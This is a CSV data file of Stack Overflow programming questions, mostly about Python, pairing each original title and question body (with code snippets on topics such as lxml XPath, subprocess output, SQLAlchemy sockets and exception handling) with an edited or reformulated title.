originalTitle,body,reformulatedTitle
Nice way to inverse-sort (permute) a list using a list of indices in-place?," Here's a example of what I want to do I can do it with enumerate, list and so on, but I would like to directly affect spam_list, like list.sort() and not copy it like sorted()Edit : pushed a string example to avoid confusion between indices and values of spam_listEdit : turned out this is a duplicate of Python sort parallel arrays in place?. Well, I can't delete so much efforts for SO consistency arguments. <code>  spam_list = [""We"", ""are"", ""the"", ""knights"", ""who"", ""say"", ""Ni""]spam_order = [0,1,2,4,5,6,3]spam_list.magical_sort(spam_order)print(spam_list)[""We"", ""are"", ""the"", ""who"", ""say"", ""Ni"", ""knights""]",In-place way to apply a permutation to a list? (inverse of sorting-by-key)
Get Tkinter Label Text?," Im making a list of addresses that the user will select from, and the address text will be returned. I need to use Tkinter.Label because the Tkinter.Listbox will not allow for newlines.The kicker is there is no .get()-like method in the Label class... I know I can do something like: However, I have a list of 5-20 address' keeping a seperate array of StringVar()'s will be difficult b/c I have no way of identifying the loc of the active label. I would like to just access the activated widget contents.Is Tkinter.Label the right widget to be using? <code>  v = StringVar()Label(master, textvariable=v).pack()v.set(""New Text!"") ...print v.get()",How to get the Tkinter Label text?
Initialising an array of fixed size in python," I would like to know how i can initialize an array(or list), yet to be populated with values, to have a defined size.For example in C: How do I do that in Python? <code>  int x[5]; /* declared without adding elements*/",Initialising an array of fixed size in Python
Is Scala Functional Programming Language?," I've learned programming from Java, then tried to learn one programming language per year, second was C++, then Python. It came to learn next one, I looked for something new, I choose Scala because it was compatible with Java and could be some transition from OOP to Functional Programming. It was cool, learning new paradigms, new style and new way of thinking. It was great experience just read about elegant Scala concepts, and much better to code on Scala. Reading a lot of articles I faced this article criticizing Scala: Scala is not a functional programming language. It is a statically typed object oriented language with closures.After reading this articles some doubts came to me, I really like Scala and was starting to write on Scala more, but is Scala suits definition of Functional Programming? Is that article says truth or just faking readers? Must I learn Haskell or some other Functional Programming Language to really experience FP?UPDATE: Expecting rational answers with good examples, without causing disputes. <code> ",Is Scala a Functional Programming Language?
Find the Friday of previous/last week, Eg1. Suppose I have a day 4/30/07 .Then I need to get 4/27/07. Eg2. Suppose I have a day 6/29/07 .Then I need to get 6/22/07. <code> ,Find the Friday of previous/last week in python
Ordered Sets Python 2.7.1," I have a list that I'm attempting to remove duplicate items from. I'm using python 2.7.1 so I can simply use the set() function. However, this reorders my list. Which for my particular case is unacceptable. Below is a function I wrote; which does this. However I'm wondering if there's a better/faster way. Also any comments on it would be appreciated. The above function assumes that none of the items will be None, and that the items are in order (ie, ['a', 'a', 'a', 'b', 'b', 'c', 'd'])The above function returns ['a', 'a', 'a', 'b', 'b', 'c', 'd'] as ['a', 'b', 'c', 'd']. <code>  def ordered_set(list_): newlist = [] lastitem = None for item in list_: if item != lastitem: newlist.append(item) lastitem = item return newlist",Ordered Sets Python 2.7
Spliting strings by capltal letters regex python," I am trying to split strings into lists of ""tags"" in python. The splitting should handle strings such as ""HappyBirthday"" and remove most punctuation but preserve hyphens, and apostrophes. My starting point is: I would want to turn this sample data: Into: P.S. I am sorry my description isn't very good. I am not sure how to explain it, and have been mostly unsuccessful with google. I hope the example illustrates it properly.Edit: i think i needed to be more precise, so also,if the word is hypenated and capital, like 'UN-American' will it keep it as one word so output would be 'UN-American'if the hyphen has a space on either or both sides, a la 'THIS- is' or 'This - is' it should ignore the hypen and produce [""THIS"", ""is""] and [""This"", ""is""] respecticly, and simmilarly for an apostrophe if its in the middle of a word like ""What'sItCalled"" it should produce [""What's"",""It"", ""Called""]  <code>  tags = re.findall(""([A-Z]{2,}(?=[A-Z]|$)|[A-Z][a-z]*)|\w+-\w+|[\w']+"" Jeff's dog is un-American SomeTimes! BUT NOTAlways ['Jeff's', 'dog', 'is', 'un-American', 'Some', 'Times', 'BUT', 'NOT', 'Always']",Word tokenization using python regular expressions
python empty class object," I'm teaching a Python class on object-oriented programming and as I'm brushing up on how to explain classes, I saw an empty class definition: The example then goes on to define a name and other attributes for an object of this class: Interesting!I'm wondering if there's a way to dynamically define a function for an instance of a class like this? something like: This doesn't work in my Python interpreter, but is there another way of doing it? <code>  class Employee: pass john = Employee()john.full_name = ""john doe"" john.greet() = print 'Hello, World!'",Empty class object in Python
Is it a good practice to automatically add names to __all__?," Is this a good practice in Python (from Active State Recipes -- Public Decorator)? The general idea would be to define a decorator that takes a function or classand adds its name to the __all__ of the current module. <code>  import sysdef public(f): """"""Use a decorator to avoid retyping function/class names. * Based on an idea by Duncan Booth: http://groups.google.com/group/comp.lang.python/msg/11cbb03e09611b8a * Improved via a suggestion by Dave Angel: http://groups.google.com/group/comp.lang.python/msg/3d400fb22d8a42e1 """""" all = sys.modules[f.__module__].__dict__.setdefault('__all__', []) if f.__name__ not in all: # Prevent duplicates if run from an IDE. all.append(f.__name__) return fpublic(public) # Emulate decorating ourself",Is it a good practice to add names to __all__ using a decorator?
XPath predicate with sub-paths?," I'm trying to understand and XPath that was sent to me for use with ACORD XML forms (common format in insurance). The XPath they sent me is (truncated for brevity): Where I'm running into trouble is that Python's lxml library is telling me that [InsuredOrPrincipalInfo/InsuredOrPrincipalRoleCd=""AN""] is an invalid predicate. I'm not able to find anywhere in the XPath spec on predicates which identifies this syntax so that I can modify this predicate to work.Is there any documentation on what exactly this predicate is selecting? Also, is this even a valid predicate, or has something been mangled somewhere?Possibly related:I believe the company I am working with is an MS shop, so this XPath may be valid in C# or some other language in that stack? I'm not entirely sure.Updates:Per comment demand, here is some additional info.XML sample: Code sample (with full XPath instead of snippet): <code>  ./PersApplicationInfo/InsuredOrPrincipal[InsuredOrPrincipalInfo/InsuredOrPrincipalRoleCd=""AN""]/GeneralPartyInfo <ACORD> <InsuranceSvcRq> <HomePolicyQuoteInqRq> <PersPolicy> <PersApplicationInfo> <InsuredOrPrincipal> <InsuredOrPrincipalInfo> <InsuredOrPrincipalRoleCd>AN</InsuredOrPrincipalRoleCd> </InsuredOrPrincipalInfo> <GeneralPartyInfo> <Addr> <Addr1></Addr1> </Addr> </GeneralPartyInfo> </InsuredOrPrincipal> </PersApplicationInfo> </PersPolicy> </HomePolicyQuoteInqRq> </InsuranceSvcRq></ACORD> >>> from lxml import etree>>> tree = etree.fromstring(raw)>>> tree.find('./InsuranceSvcRq/HomePolicyQuoteInqRq/PersPolicy/PersApplicationInfo/InsuredOrPrincipal[InsuredOrPrincipalInfo/InsuredOrPrincipalRoleCd=""AN""]/GeneralPartyInfo/Addr/Addr1')Traceback (most recent call last): File ""<console>"", line 1, in <module> File ""lxml.etree.pyx"", line 1409, in lxml.etree._Element.find (src/lxml/lxml.etree.c:39972) File ""/Library/Python/2.5/site-packages/lxml-2.3-py2.5-macosx-10.3-i386.egg/lxml/_elementpath.py"", line 271, in find it = iterfind(elem, path, namespaces) File ""/Library/Python/2.5/site-packages/lxml-2.3-py2.5-macosx-10.3-i386.egg/lxml/_elementpath.py"", line 261, in iterfind selector = _build_path_iterator(path, namespaces) File ""/Library/Python/2.5/site-packages/lxml-2.3-py2.5-macosx-10.3-i386.egg/lxml/_elementpath.py"", line 245, in _build_path_iterator selector.append(ops[token[0]](_next, token)) File ""/Library/Python/2.5/site-packages/lxml-2.3-py2.5-macosx-10.3-i386.egg/lxml/_elementpath.py"", line 207, in prepare_predicate raise SyntaxError(""invalid predicate"")SyntaxError: invalid predicate",XPath predicate with sub-paths with lxml?
how can i make ipdb show more lines of context while debugging?," By default, during debugging in IPython, ipdb shows one line above and one line below the current position in code. Is there an easy way to make the area shown a bit bigger? I'd think it would be configurable, but haven't been able to find it. <code> ",How can I make ipdb show more lines of context while debugging?
Is it possible to use Mysql with SqlAlchemy and Flask if my mysql socket isn't in tmp?," The location for mysql.sock on my system is /usr/local/mysql5/mysqld.sock When I try to use mysql via sqlalchemy from flask, I get: The mysql program connects correctly to the database, as does every other mysql client on my system.My my.cnf has the correct location for the socket The base ""SQLAlchemy"" library has an option where you can specify the location of the mysql.sock, but this isn't exposed through the sqlalchemy / flask libraryhttp://packages.python.org/Flask-SQLAlchemy/config.htmlMy questions:Where does sqlalchemy get the idea that /tmp/mysql.sock is the correct location?Is there a way to change the default via the Flash-SQLAlchemy connector <code>  thrilllap-2:tmp reuven$ mysqld --print-defaultsmysqld would have been started with the following arguments:--socket=/usr/local/mysql5/mysqld.sock --port=3306 File ""build/bdist.macosx-10.6-intel/egg/MySQLdb/connections.py"", line 187, in __init__sqlalchemy.exc.OperationalError: (OperationalError) (2002, ""Can't connect to local MySQL server through socket '/tmp/mysql.sock' (2)"") None None [client]port = 3306socket = /usr/local/mysql5/mysqld.sock [safe_mysqld]socket = /usr/local/mysql5/mysqld.sock [mysqld_safe]socket = /usr/local/mysql5/mysqld.sock [mysqld]socket = /usr/local/mysql5/mysqld.sock port = 3306",Is it possible to use Mysql with SqlAlchemy and Flask if my mysql socket isn't in /tmp?
Create a numpy matrix with elements a function of indices," How can I create a numpy matrix with its elements being a function of its indices?For example, a multiplication table: a[i,j] = i*jAn Un-numpy and un-pythonic would be to create an array of zeros and then loop through.There is no doubt that there is a better way to do this, without a loop.However, even better would be to create the matrix straight-away. <code> ",Create a numpy matrix with elements as a function of indices
Python: Cut of the last word of a sentence?," What's the best way to slice the last word from a block of text? I can think of Split it to a list (by spaces) and removing the last item, then reconcatenating the list.Use a regular expression to replace the last word.I'm currently taking approach #1, but I don't know how to concatenate the list... Any code examples are much appreciated. <code>  content = content[position-1:position+249] # Contentwords = string.split(content, ' ')words = words[len[words] -1] # Cut of the last word",Python: Cut off the last word of a sentence?
How well does your language's support unicode in practice?," I'm looking into new languages, kind of craving for one where I no longer need to worry about charset problems amongst inordinate amounts of other niggles I have with PHP for a new project.I tend to find Java too verbose and messy, and my not wanting to touch Windows with a 6-foot pole tends to rule out .Net. That leaves essentially everything else -- except PHP, C and C++ (the latter two of which I know get messy with unicode stuff irrespective of the ICU library).I've short listed a few languages to date, namely Ruby (loved the mixins), Python, Lisp and Javascript (node.js). However, I'm coming with highly inconsistent information on unicode support and I'm dreading (lack of time...) to learn each and every one of them to the point where I can safely break it to rule it out.In so far as I understood, Python 3 seems to have it. As does Ruby 1.9. Lisp not necessarily. Javascript presumably.There's arguably more than unicode support to a language, but in my experience it tends to become a major drawback when dealing with locale.I also realize the question is somewhat subjective. (Please don't close it on that grounds: I'm actually linking to several SO threads which I found unsatisfying.) But... as a user of any of these languages, how well do they support unicode in practice? <code> ",How well does your language support unicode in practice?
"Python, Printing multiple times,"," How can I repeat a string multiple times, multiple times? I know I can use a for loop, but I would like to repeat a string x times per row, over n rows.For example, if the user enters 2, the output would be: Where x equals 2, and n equals 4. <code>  @@@@@@@@",How to print a string multiple times?
"""Best"" way to integrate Django with an Ajax"," Obviously, horses for courses, but what are some good ways to integrate javascript libraries with one's Django application?I'm planning on using jQuery, mostly because it seems popular and looks powerful (but I'm open to other suggestions).Are there python-side libraries that are very helpful or essential? Or is it best simply to create JSON views, and hand-code the javascript (using an appropriate javascript framework)?I've looked (briefly) at Dajax, but based on the scant documentation, it's not clear that it really gives me very much. I would certainly prefer something with a bit more documentation.Other answers here suggest that pjax doesn't necessarily work well with many browsers, so that's out.Edit: Thanks everyone. I'll be looking at tastypie to simplify exposing some json views, and man up to write some javascript by hand (Which having done a tiny bit earlier this year, seems much better than it was in the late 90s). <code> ","""Best"" way to integrate Django with an Ajax library"
Display a list of user defined functions in the Python IDLE environment," Is it possible to display a list of all user functions in the IDLE session?I can see them popping up in the autocomplete, so maybe there is other way to just display only the user functions defined for the session. It is useful when you forget the name of the function. And also when you want to make sure that you don't lose source code for a function when a session is closed. <code> ",Display a list of user defined functions in the Python IDLE session
Are lists thread-safe," I notice that it is often suggested to use queues with multiple threads, instead of lists and .pop(). Is this because lists are not thread-safe, or for some other reason? <code> ",Are lists thread-safe?
Python - Iterating through list," I want to iterate through list of list.I want to iterate through irregularly nested lists inside list also.Can anyone let me know how can I do that? <code>  x = [u'sam', [['Test', [['one', [], []]], [(u'file.txt', ['id', 1, 0])]], ['Test2', [], [(u'file2.txt', ['id', 1, 2])]]], []]",Iterating through list of list in Python
Python - Iterating through list of list," I want to iterate through list of list.I want to iterate through irregularly nested lists inside list also.Can anyone let me know how can I do that? <code>  x = [u'sam', [['Test', [['one', [], []]], [(u'file.txt', ['id', 1, 0])]], ['Test2', [], [(u'file2.txt', ['id', 1, 2])]]], []]",Iterating through list of list in Python
Python: How to read stdout from an other process while it is running?," During the runtime of a process I would like to read its stdout and write it to a file. Any attempt of mine however failed because no matter what I tried as soon as I tried reading from the stdout it blocked until the process finished.Here is a snippet of what I am trying to do. (The first part is simply a python script that writes something to stdout.) I know that there are multiple questions out there that deal with the same subject. However, none of the ones I found was able to answer my question. <code>  import subprocessp = subprocess.Popen('python -c \'\from time import sleep\n\for i in range(3):\n\ sleep(1)\n\ print ""Hello"", i\\'', shell = True, stdout = subprocess.PIPE)while p.poll() == None: #read the stdout continuously passprint ""Done""",Python: How to read stdout non blocking from another process?
Python: How to read stdout non blocking from an other process?," During the runtime of a process I would like to read its stdout and write it to a file. Any attempt of mine however failed because no matter what I tried as soon as I tried reading from the stdout it blocked until the process finished.Here is a snippet of what I am trying to do. (The first part is simply a python script that writes something to stdout.) I know that there are multiple questions out there that deal with the same subject. However, none of the ones I found was able to answer my question. <code>  import subprocessp = subprocess.Popen('python -c \'\from time import sleep\n\for i in range(3):\n\ sleep(1)\n\ print ""Hello"", i\\'', shell = True, stdout = subprocess.PIPE)while p.poll() == None: #read the stdout continuously passprint ""Done""",Python: How to read stdout non blocking from another process?
Python add new item to dictionary," I want to add an item to an existing dictionary in Python. For example, this is my dictionary: I want to add a new item such that: How can I achieve this? <code>  default_data = { 'item1': 1, 'item2': 2,} default_data = default_data + {'item3':3}",Add a new item to a dictionary in Python
what is return of os.system() in python?, I came across this: What is return value of os.system()? Why I get 0? <code>  >>> import os>>> os.system('ls')file.txt README0,What is the return value of os.system() in Python?
Catch multiple exceptions in one line," I know that I can do: I can also do this: But if I want to do the same thing inside two different exceptions, the best I can think of right now is to do this: Is there any way that I can do something like this (since the action to take in both exceptions is to say please): Now this really won't work, as it matches the syntax for: So, my effort to catch the two distinct exceptions doesn't exactly come through.Is there a way to do this? <code>  try: # do something that may failexcept: # do this if ANYTHING goes wrong try: # do something that may failexcept IDontLikeYouException: # say pleaseexcept YouAreTooShortException: # stand on a ladder try: # do something that may failexcept IDontLikeYouException: # say pleaseexcept YouAreBeingMeanException: # say please try: # do something that may failexcept IDontLikeYouException, YouAreBeingMeanException: # say please try: # do something that may failexcept Exception, e: # say please",Catch multiple exceptions in one line (except block)
Python split consecutive delimiters," The default split method in Python treats consecutive spaces as a single delimiter. But if you specify a delimiter string, consecutive delimiters are not collapsed: What is the most straightforward way to collapse consecutive delimiters? I know I could just remove empty strings from the result list: But is there a more convenient way? <code>  >>> 'aaa'.split('a')['', '', '', ''] >>> result = 'aaa'.split('a')>>> result['', '', '', '']>>> result = [item for item in result if item]",How to collapse consecutive delimiters?
How to install lxml with easy_install?," I'm having difficulty installing lxml with easy_install on Ubuntu 11.When I type $ easy_install lxml I get: It seems that libxslt or libxml2 is not installed. I've tried following the instructions at http://www.techsww.com/tutorials/libraries/libxslt/installation/installing_libxslt_on_ubuntu_linux.php and http://www.techsww.com/tutorials/libraries/libxml/installation/installing_libxml_on_ubuntu_linux.php with no success.If I try wget ftp://xmlsoft.org/libxml2/libxml2-sources-2.6.27.tar.gz I get If I try the other first, I'll get to ./configure --prefix=/usr/local/libxslt --with-libxml-prefix=/usr/local/libxml2 and that will fail eventually with: I've tried both versions 2.6.27 and 2.6.29 of libxml2 with no difference.Leaving no stone unturned, I have successfully done sudo apt-get install libxml2-dev, but this changes nothing. <code>  Searching for lxmlReading http://pypi.python.org/simple/lxml/Reading http://codespeak.net/lxmlBest match: lxml 2.3Downloading http://lxml.de/files/lxml-2.3.tgzProcessing lxml-2.3.tgzRunning lxml-2.3/setup.py -q bdist_egg --dist-dir /tmp/easy_install-7UdQOZ/lxml-2.3/egg-dist-tmp-GacQGyBuilding lxml version 2.3.Building without Cython.ERROR: /bin/sh: xslt-config: not found** make sure the development packages of libxml2 and libxslt are installed **Using build configuration of libxslt In file included from src/lxml/lxml.etree.c:227:0:src/lxml/etree_defs.h:9:31: fatal error: libxml/xmlversion.h: No such file or directorycompilation terminated. <successful connection info>==> SYST ... done. ==> PWD ... done.==> TYPE I ... done. ==> CWD (1) /libxml2 ... done.==> SIZE libxml2-sources-2.6.27.tar.gz ... done.==> PASV ... done. ==> RETR libxml2-sources-2.6.27.tar.gz ... No such file `libxml2-sources-2.6.27.tar.gz'. checking for libxml libraries >= 2.6.27... configure: error: Could not find libxml2 anywhere, check ftp://xmlsoft.org/.",How to install lxml on Ubuntu
Cleare all item from the queue," How can I clear a queue. For example I have datas in a queue, but for some reason I don't need the existing data, and just want to clear the queue.Is there any way? Will this work: <code>  oldQueue = Queue.Queue()",Clear all items from the queue
Clear all items from the queue," How can I clear a queue. For example I have datas in a queue, but for some reason I don't need the existing data, and just want to clear the queue.Is there any way? Will this work: <code>  oldQueue = Queue.Queue()",Clear all items from the queue
Clear all items from the queue ," How can I clear a queue. For example I have datas in a queue, but for some reason I don't need the existing data, and just want to clear the queue.Is there any way? Will this work: <code>  oldQueue = Queue.Queue()",Clear all items from the queue
dict literal vs dict constructor - any preferred?," Using PyCharm, I noticed it offers to convert a dict literal: into a dict constructor: Do these different approaches differ in some significant way?(While writing this question I noticed that using dict() it seems impossible to specify a numeric key .. d = {1: 'one', 2: 'two'} is possible, but, obviously, dict(1='one' ...) is not. Anything else?) <code>  d = { 'one': '1', 'two': '2',} d = dict(one='1', two='2')",Is there a difference between using a dict literal and a dict constructor?
Python Right Click Menu Using PyGTK," So I'm still fairly new to Python, and have been learning for a couple months, but one thing I'm trying to figure out is say you have a basic window... I wanna right click inside this window, and have a menu pop up like alert, copy, exit, whatever I feel like putting down.How would I accomplish that? <code>  #!/usr/bin/env pythonimport sys, osimport pygtk, gtk, gobjectclass app: def __init__(self): window = gtk.Window(gtk.WINDOW_TOPLEVEL) window.set_title(""TestApp"") window.set_default_size(320, 240) window.connect(""destroy"", gtk.main_quit) window.show_all()app()gtk.main()",Right Click Menu (context menu) using PyGTK
import python modules with the same name," I have several Python projects and they all have a conf package: For each project, I have created a .pth file in the site-packages folder with this contents: I can access modules in /some_folder/project_1/: but not the modules in /another_folder/project_2/: It looks as if python only searches the first conf path underneath any folders in sys.path. Is there a way to fix that? <code>  /some_folder/project_1/ conf/ __init__.py some_source_file.py/another_folder/project_2/ conf/ __init__.py another_source_file.py .../site-packages/project_1.pth:import sys; sys.path.append('/some_folder/project_1/').../site-packages/project_2.pth:import sys; sys.path.append('/another_folder/project_2/') import conf.some_source_file import conf.another_source_fileAttributeError: 'module' object has no attribute 'another_source_file'",Import Python modules with the same name
Using exponentiation ** less effcient than math.sqrt?," A quote from ""Python Programming: An Introduction to Computer Science"" We could have taken the square root using exponentiation **. Using math.sqrt is somewhat more efficient.""Somewhat"", but to what extent, and how? <code> ",Using exponentiation **0.5 less efficient than math.sqrt?
Using exponentiation ** less efficient than math.sqrt?," A quote from ""Python Programming: An Introduction to Computer Science"" We could have taken the square root using exponentiation **. Using math.sqrt is somewhat more efficient.""Somewhat"", but to what extent, and how? <code> ",Using exponentiation **0.5 less efficient than math.sqrt?
Python: Convert an iterable to a stream?," If I've got an iterable containing strings, is there a simple way to turn it into a stream? I want to do something like this: <code>  def make_file(): yield ""hello\n"" yield ""world\n""output = tarfile.TarFile()stream = iterable_to_stream(make_file())output.addfile(, stream)",How to convert an iterable to a stream?
Python - Are there more search paths than in sys.path?," I thought that the sys.path was a complete list of all search paths for Python modules.However, on my Ubuntu machine, '/usr/local/lib/python2.6/dist-packages/' is where almost all my modules are and that path is not in sys.path. And I can still import any module on that path. EDIT, NOT TRUE: Even if I set the sys.path to the empty list, I can still import from that path. Where does this implicit knowledge of the dist-packages path come from? And are there any other paths in this implicit group of search paths, or whatever it is?EDIT: It seems like the second part of my post is not true. Indeed, ""sys.path = []"", will mean that I can not import anything, not even from my current working directory. My apologies.  <code> ",Are there more search paths than in sys.path?
Python - detect charset and convert to utf-8, Is there any universal method to detect string charset? I user IPTC tags and have no known encoding. I need to detect it and then change them to utf-8.Anybody can help? <code> ,Detect charset and convert to utf-8 in Python?
How to call a python function from an another file," I have this class in my parser.py file after that it defined a function which trying to find an host id from a xml file Now i want to use call this get_id function from an another file.I tried so many time but it shows an error i.e. module can't be import <code>  class HostInfo(object):def __init__(self, host_id): self.osclass = [] self.osmatch = [] self.osfingerprint = [] self.portused = [] self.ports = [] self.extraports = [] self.tcpsequence = {} self.hostnames = [] self.tcptssequence = {} self.ipidsequence = {} self.trace = {'port': '', 'proto': '', 'hop': []} self.status = {} self.address = [] self.hostscript = [] # Umit extension self.id = host_id self.comment = '' # XXX this structure it not being used yet. self.nmap_host = { 'status': {'state': '', 'reason': ''}, 'smurf': {'responses': ''}, 'times': {'to': '', 'srtt': '', 'rttvar': ''}, 'hostscript': [], 'distance': {'value': ''}, 'trace': {'port': '', 'proto': '', 'hop': []}, 'address': [], 'hostnames': [], 'ports': [], 'uptime': {'seconds': '', 'lastboot': ''}, 'tcpsequence': {'index': '', 'values': '', 'class': ''}, 'tcptssequence': {'values': '', 'class': ''}, 'ipidsequence': {'values': '', 'class': ''}, 'os': {} } def get_id(self): try: return self._id except AttributeError: raise Exception(""Id is not set yet."")def set_id(self, host_id): try: self._id = int(host_id) except (TypeError, ValueError): raise Exception(""Invalid id! It must represent an integer, "" ""received %r"" % host_id)",How to call a python class function from another file
How to call a python function from another file," I have this class in my parser.py file after that it defined a function which trying to find an host id from a xml file Now i want to use call this get_id function from an another file.I tried so many time but it shows an error i.e. module can't be import <code>  class HostInfo(object):def __init__(self, host_id): self.osclass = [] self.osmatch = [] self.osfingerprint = [] self.portused = [] self.ports = [] self.extraports = [] self.tcpsequence = {} self.hostnames = [] self.tcptssequence = {} self.ipidsequence = {} self.trace = {'port': '', 'proto': '', 'hop': []} self.status = {} self.address = [] self.hostscript = [] # Umit extension self.id = host_id self.comment = '' # XXX this structure it not being used yet. self.nmap_host = { 'status': {'state': '', 'reason': ''}, 'smurf': {'responses': ''}, 'times': {'to': '', 'srtt': '', 'rttvar': ''}, 'hostscript': [], 'distance': {'value': ''}, 'trace': {'port': '', 'proto': '', 'hop': []}, 'address': [], 'hostnames': [], 'ports': [], 'uptime': {'seconds': '', 'lastboot': ''}, 'tcpsequence': {'index': '', 'values': '', 'class': ''}, 'tcptssequence': {'values': '', 'class': ''}, 'ipidsequence': {'values': '', 'class': ''}, 'os': {} } def get_id(self): try: return self._id except AttributeError: raise Exception(""Id is not set yet."")def set_id(self, host_id): try: self._id = int(host_id) except (TypeError, ValueError): raise Exception(""Invalid id! It must represent an integer, "" ""received %r"" % host_id)",How to call a python class function from another file
filtering sqlalchemy database by id, I need to query a SQLAlchemy database by its id something similar to User.query.filter_by(username='peter')but for id. How do I do this? [Searching over Google and SO didn't help] <code> ,How to query database by id using SqlAlchemy?
Efficient item binning algorithm (itertools/numpy)," I think this is a common combinatorics problem, but I can't seem to find a name for it or any material about it. I am doing this in Python and numpy, but if there is a fast matrix method for this, I can probably translate.Basically, given n items, I need to generate all ways to put them in m bins. As an example, binning 4 items into 3 bins would give something like [(4, 0, 0), (3, 1, 0), (3, 0, 1), (2, 2, 0), (2, 1, 1), ...]. This is a product with a fixed total.Implementing this with itertools is straightforward. Unfortunately, I think doing subsequent calculations in loops will be inefficient. Working with this as a 2D numpy array would be faster later on, but I can't figure out an efficient way to build an array with this. I could iterate over the ifilter result, building a list of the possibilities, and use this to construct the array, but that seems like a huge waste.I'm guessing the best way to do this is to build everything ""the numpy way"", but I'm not sure how to do this. There is a speedy product implementation on stackoverflow: Using numpy to build an array of all combinations of two arrays. I'm guessing you can modify this only to output products with the right sum. The size of the array should be ((m-1) + n) choose n, since there are m-1 bin boundaries.Any ideas? Benchmarks much appreciated, but not required. <code>  import itertoolsdef fixed_total_product(bins, num_items):"""""" Return iterator of all item binning possibilities. """"""return itertools.ifilter(lambda combo: sum(combo) == num_items, itertools.product(xrange(num_items + 1), repeat=bins))",Efficient item binning algorithm (itertools/numpy) [Solved]
Python: How to remove all duplicate items from a list," How would I use python to check a list and delete all duplicates? I don't want to have to specify what the duplicate item is - I want the code to figure out if there are any and remove them if so, keeping only one instance of each. It also must work if there are multiple duplicates in a list. For example, in my code below, the list lseparatedOrbList has 12 items - one is repeated six times, one is repeated five times, and there is only one instance of one. I want it to change the list so there are only three items - one of each, and in the same order they appeared before. I tried this: But I get the error: I'm guessing because it's because I'm trying to loop through lseparatedOrbList while I loop through it, but I can't think of another way to do it. <code>  for i in lseparatedOrbList: for j in lseparatedOrblist: if lseparatedOrbList[i] == lseparatedOrbList[j]: lseparatedOrbList.remove(lseparatedOrbList[j]) Traceback (most recent call last): File ""qchemOutputSearch.py"", line 123, in <module> for j in lseparatedOrblist:NameError: name 'lseparatedOrblist' is not defined",How to remove all duplicate items from a list
parsing .xsd in pyton," I need to parse a file .xsd in Python as i would parse an XML.I am using libxml2.I have to parse an xsd that look as follow: when i access with tells me that cannot find the path.while if i remove all the xs: as follow in this way it works Does anyone knows how can i get read of this problem fixing a prefix? righ now i am preparsing the file removing the xs: but it's an orrible solution and i really hope to be able to find a better solution.(I did not try with py-dom-xpath yet and i do not know if may work even with the xs:)thanks,ste <code>  <xs:complexType name=""ClassType""><xs:sequence> <xs:element name=""IeplcHeader""> <xs:complexType> <xs:sequence> <xs:element name=""device-number"" type=""xs:integer"" fixed=""1""/> </xs:sequence> <xs:attribute name=""version"" type=""xs:integer"" use=""required"" fixed=""0""/> </xs:complexType> </xs:element> doc.xpathEval('//xs:complexType/xs:sequence/xs:element[@name=""IeplcHeader""]'): <complexType name=""ClassType""> <sequence> <element name=""IeplcHeader""> <complexType> <sequence> <element name=""device-number"" type=""xs:integer"" fixed=""1""/> </sequence> <attribute name=""version"" type=""xs:integer"" use=""required"" fixed=""0""/> </complexType> </element> doc.xpathEval('//complexType/sequence/element[@name=""IeplcHeader""]'):",parsing .xsd in python
"How can i use the unique(a, 'rows') from MATLab at python?"," I'm translating some stuff from MATLAB to the Python language.There's this command, unique(a), in NumPy. But since the MATLAB program runs the 'rows' command also, it gives something a little different.Is there a similar command in Python or should I make some algorithm that does the same thing? <code> ","How can I use the unique(a, 'rows') from MATLAB in Python?"
"(python) how to run "" ps cax | grep something "" in python?"," How do I run a command with a pipe | in it?The subprocess module seems complex...Is there something like as in shell script? <code>  output,error = `ps cax | grep something`","How to run "" ps cax | grep something "" in Python?"
"batch equivalent of ""source"" on windows: how to run a python script from a virtualenv"," I've done a fair bit of bash scripting, but very little batch scripting on Windows. I'm trying to activate a Python virtualenv, run a Python script, then deactivate the virtualenv when the script exits.I've got a folder called env, which is my virtualenv, and a folder called work, which contains my scripts.This is what I've got so far: However, when I run the script, it activates the virtualenv then stops. It does not get to the second line and run the Python script. Is there a way to ""source"" the activate script folder, so that the rest of the batch script can be run as if I'd called activate.bat from the command line? <code>  %~dp0env\Scripts\activate.batpython %~dp0work\script.pydeactivate","Batch equivalent of ""source"" on Windows: how to run a Python script from a virtualenv"
"Python, how to ready bytes from file and save it?"," I want to read bytes from a file and then write those bytes to another file, and save that file.How do I do this? <code> ","Python, how to read bytes from file and save it?"
"In C++, the language provides macros __FILE__, __FUNCTION__, __LINE__. How does python do this?"," In C++, I can print debug output like this: How can I do something similar in Python? <code>  printf( ""FILE: %s, FUNC: %s, LINE: %d, LOG: %s\n"", __FILE__, __FUNCTION__, __LINE__, logmessage);","How to determine file, function and line number?"
